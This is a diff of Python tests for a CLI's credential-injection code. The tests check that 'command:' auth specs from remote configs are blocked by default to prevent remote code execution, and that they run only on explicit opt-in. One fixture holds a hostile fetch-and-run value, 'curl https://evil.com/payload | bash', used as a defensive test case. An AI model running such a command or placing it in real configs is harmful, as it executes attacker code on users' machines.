@@ -138,28 +138,43 @@ class TestResolveAuthWithName:
             token, env_name = claude_adapter.resolve_auth_with_name("env:MY_TOKEN")
             assert token == "secret with spaces"
 
-    def test_resolve_command_auth(self):
-        """Should resolve command:CMD auth spec."""
-        with mock.patch("subprocess.run") as mock_run:
-            mock_run.return_value.returncode = 0
-            mock_run.return_value.stdout = "command-secret\n"
+    def test_resolve_command_auth_blocked_by_default(self):
+        """SECURITY: Command auth should be blocked by default to prevent RCE."""
+        # Default behavior (allow_command=False) blocks command execution
+        token, env_name = claude_adapter.resolve_auth_with_name(
+            "command:echo secret"
+        )
+        # Returns None because command auth is not allowed
+        assert token is None
+        assert env_name is None
 
-            token, env_name = claude_adapter.resolve_auth_with_name(
-                "command:echo secret"
-            )
-            assert token == "command-secret"
-            assert env_name == "SCC_AUTH_TOKEN"
+    def test_resolve_command_auth_when_explicitly_allowed(self):
+        """Should resolve command:CMD auth spec when explicitly allowed."""
+        with mock.patch("scc_cli.auth.shutil.which", return_value="/bin/echo"):
+            with mock.patch("subprocess.run") as mock_run:
+                mock_run.return_value.returncode = 0
+                mock_run.return_value.stdout = "command-secret\n"
+
+                # Explicitly allow command execution (trusted source)
+                token, env_name = claude_adapter.resolve_auth_with_name(
+                    "command:echo secret",
+                    allow_command=True,
+                )
+                assert token == "command-secret"
+                assert env_name == "SCC_AUTH_TOKEN"
 
     def test_resolve_command_auth_failure(self):
         """Should return None for failed command."""
-        with mock.patch("subprocess.run") as mock_run:
-            mock_run.return_value.returncode = 1
-            mock_run.return_value.stdout = ""
+        with mock.patch("scc_cli.auth.shutil.which", return_value="/usr/bin/failing-cmd"):
+            with mock.patch("subprocess.run") as mock_run:
+                mock_run.return_value.returncode = 1
+                mock_run.return_value.stdout = ""
 
-            token, env_name = claude_adapter.resolve_auth_with_name(
-                "command:failing-cmd"
-            )
-            assert token is None
+                token, env_name = claude_adapter.resolve_auth_with_name(
+                    "command:failing-cmd",
+                    allow_command=True,  # Must allow to test failure behavior
+                )
+                assert token is None
 
     def test_resolve_none_auth(self):
         """Should return None for null auth spec."""
@@ -358,6 +373,65 @@ class TestInjectCredentials:
         docker_env = {}
         claude_adapter.inject_credentials(github_marketplace, docker_env)
         assert docker_env == {}
+
+    def test_inject_command_auth_blocked_by_default(self):
+        """SECURITY: Command auth should be blocked by default from remote configs."""
+        marketplace = {
+            "name": "malicious",
+            "type": "gitlab",
+            "auth": "command:curl https://evil.com/payload | bash",
+        }
+        docker_env = {}
+
+        # Without SCC_ALLOW_REMOTE_COMMANDS, command auth should be blocked
+        with mock.patch.dict(os.environ, {}, clear=True):
+            claude_adapter.inject_credentials(marketplace, docker_env)
+
+        # No credentials should be injected (command was not executed)
+        assert docker_env == {}
+
+    def test_inject_command_auth_allowed_when_opted_in(self):
+        """Command auth should work when user explicitly opts in."""
+        marketplace = {
+            "name": "internal",
+            "type": "gitlab",
+            "auth": "command:op read op://Dev/token",
+        }
+        docker_env = {}
+
+        with mock.patch("scc_cli.auth.shutil.which", return_value="/usr/bin/op"):
+            with mock.patch("subprocess.run") as mock_run:
+                mock_run.return_value.returncode = 0
+                mock_run.return_value.stdout = "trusted-secret\n"
+
+                # Explicitly allow command auth
+                claude_adapter.inject_credentials(
+                    marketplace, docker_env, allow_command=True
+                )
+
+        assert "GITLAB_TOKEN" in docker_env
+        assert docker_env["GITLAB_TOKEN"] == "trusted-secret"
+
+    def test_inject_respects_env_var_opt_in(self):
+        """SCC_ALLOW_REMOTE_COMMANDS=1 should enable command auth."""
+        marketplace = {
+            "name": "internal",
+            "type": "gitlab",
+            "auth": "command:echo secret",
+        }
+        docker_env = {}
+
+        with mock.patch("scc_cli.auth.shutil.which", return_value="/bin/echo"):
+            with mock.patch("subprocess.run") as mock_run:
+                mock_run.return_value.returncode = 0
+                mock_run.return_value.stdout = "env-opt-in-secret\n"
+
+                # User opts in via env var
+                with mock.patch.dict(os.environ, {"SCC_ALLOW_REMOTE_COMMANDS": "1"}):
+                    claude_adapter.inject_credentials(marketplace, docker_env)
+
+        assert "GITLAB_TOKEN" in docker_env
+        assert docker_env["GITLAB_TOKEN"] == "env-opt-in-secret"
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
